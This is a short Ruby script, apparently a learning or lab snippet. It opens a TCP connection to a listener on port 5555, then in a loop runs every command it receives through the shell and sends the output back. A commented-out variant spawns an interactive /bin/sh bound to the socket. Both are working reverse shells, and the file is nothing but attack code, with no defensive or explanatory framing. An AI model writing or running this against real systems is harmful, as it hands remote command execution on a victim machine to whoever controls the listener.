# Naive read from socket, and execute it separately
require 'socket'

socket = Socket.new(Socket::Constants::AF_INET, Socket::Constants::SOCK_STREAM, 0)
sockaddr = Socket.pack_sockaddr_in( 5555, '127.0.0.1' )
socket.connect(sockaddr)

loop do
  command = socket.gets
  result = `#{command}`
  socket.write(result)
end

# require 'socket'
#
# socket = TCPSocket.open('127.0.0.1', 5555)
# s = socket.to_i
# exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
